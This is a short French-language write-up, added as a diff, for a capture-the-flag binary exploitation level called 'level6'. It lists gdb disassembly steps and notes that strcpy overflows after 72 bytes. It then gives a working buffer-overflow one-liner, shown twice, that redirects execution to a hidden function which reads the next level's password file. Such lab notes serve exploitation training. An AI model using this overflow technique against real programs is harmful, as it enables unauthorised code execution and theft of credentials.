@@ -1,0 +1,22 @@
+
+
+1. gdb level6 / disass main / info function / disass n / disass m
+2.	Si l'argumenet est > 72 segfault sur la function strcpy qui est suivit d'un call de eax, on voit que la function n fait un calla system avec  "/bin/cat /home/user/level7/.pass"
+3. ./level6 `python -c 'print "\x90"*72+"\x54\x84\x04\x08"'`
+./level6 prend un argument
+
+
+
+<!-- 
+
+si arg > 72 il segfault
+
+segfault sur strcpy
+
+on voit qu'apres le strcpy il exec 
+
+info function il y a deux fonction externe non call n et m 
+
+on test de les call apres overflow 
+
+./level6 `python -c 'print "\x90"*72+"\x54\x84\x04\x08"'` -->
